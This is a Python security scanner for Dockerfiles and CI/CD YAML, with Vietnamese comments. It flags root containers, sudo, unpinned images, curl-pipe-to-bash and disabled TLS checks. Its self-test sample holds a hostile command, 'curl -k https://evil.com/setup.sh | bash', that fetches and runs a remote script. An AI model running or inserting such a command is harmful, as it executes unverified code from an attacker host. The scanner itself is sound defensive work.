#!/usr/bin/env python3
"""
Infrastructure as Code (IaC) Security Checker
Kiem tra bao mat file cau hinh ha tang (Dockerfile, CI/CD YAML, docker-compose).
Phat hien cac thiet lap khong an toan: quyen root, cong mo bat thuong, thieu xac thuc.
"""
from typing import List, Dict, Any

class IaCSecurityScanner:
    """Kiem tra cac quy tac an toan cho ha tang dang ma."""

    def scan_dockerfile(self, content: str) -> List[Dict[str, Any]]:
        findings = []
        lines = content.splitlines()
        has_user_instruction = False

        for line_no, line in enumerate(lines, 1):
            stripped = line.strip()
            # Kiem tra base image latest tag
            if stripped.startswith("FROM ") and (":latest" in stripped or ":" not in stripped.split()[1]):
                findings.append({
                    "line": line_no,
                    "rule": "Base Image Unpinned Tag (:latest)",
                    "severity": "MEDIUM",
                    "description": "Nen dung tag phien ban cu the de dam bao tinh toan ven."
                })
            # Kiem tra sudo/chown trong container
            if "sudo " in stripped:
                findings.append({
                    "line": line_no,
                    "rule": "Avoid sudo in container",
                    "severity": "HIGH",
                    "description": "Khong nen su dung sudo trong container build step."
                })
            # Kiem tra khai bao USER non-root
            if stripped.startswith("USER ") and "root" not in stripped:
                has_user_instruction = True

        if not has_user_instruction:
            findings.append({
                "line": len(lines),
                "rule": "Container Running as Root",
                "severity": "HIGH",
                "description": "Container khong khai bao USER non-root, tieng an nguy co leo thang dac quyen."
            })

        return findings

    def scan_ci_yaml(self, content: str) -> List[Dict[str, Any]]:
        findings = []
        lines = content.splitlines()
        for line_no, line in enumerate(lines, 1):
            stripped = line.strip()
            # Kiem tra go lenh curl | bash
            if "curl " in stripped and ("| bash" in stripped or "| sh" in stripped):
                findings.append({
                    "line": line_no,
                    "rule": "Insecure Script Execution (curl pipe to bash)",
                    "severity": "CRITICAL",
                    "description": "Thuc thi script tu xa truc tiep khong qua kiem tra chu ky so."
                })
            # Kiem tra bo qua verify SSL
            if "--insecure" in stripped or "-k " in stripped:
                findings.append({
                    "line": line_no,
                    "rule": "Insecure TLS/SSL Verification Disabled",
                    "severity": "HIGH",
                    "description": "Tuy chon --insecure lam mat kha nang xac thuc chung chi so TLS."
                })
        return findings

if __name__ == "__main__":
    scanner = IaCSecurityScanner()
    sample_ci = """
    test-job:
      script:
        - curl -k https://evil.com/setup.sh | bash
    """
    res = scanner.scan_ci_yaml(sample_ci)
    print(f"Phat hien {len(res)} van de bao mat CI/CD:")
    for r in res:
        print(f"[{r['severity']}] Dong {r['line']}: {r['rule']} - {r['description']}")
